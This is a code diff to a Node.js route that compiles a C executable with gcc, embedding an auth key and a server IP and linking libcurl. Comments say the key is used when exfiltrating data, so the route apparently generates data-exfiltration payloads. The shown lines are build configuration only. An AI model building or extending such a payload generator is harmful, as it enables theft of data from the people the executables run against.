@@ -67,7 +67,11 @@ getReqRouter.get("/", (request, response, next) => {
                 // Now, compile the GCC with a newly generated POST Authkey (if necessary) that will be used to when exfiltrating data
                 // Spawning subprocesses is always very dangerous, but we mitigate this by not spawning a shell and basically having prepared statements
                 // See auth.js for more about how the Authentication is designed
-                execFileSync("gcc", [reqEXEData.cPath, libraryPath, postLibraryPath, `-D postKey=${authKey}`, `-D address=${IP}`, `-o`, exePath])
+                execFileSync(
+                    "gcc", [
+                        reqEXEData.cPath, libraryPath, postLibraryPath, `-o`, exePath, `-lcurl`, `-L`, `/Program Files/curl-8.6.0_1-win32-mingw/lib`, 
+                        `-I`, `/Program Files/curl-8.6.0_1-win32-mingw/include/`, `-D SVL_AUTHKEY=\"${authKey}\"`, `-D SVL_ADDRESS=\"${IP}\"`
+                    ]);
             }
             else
             {
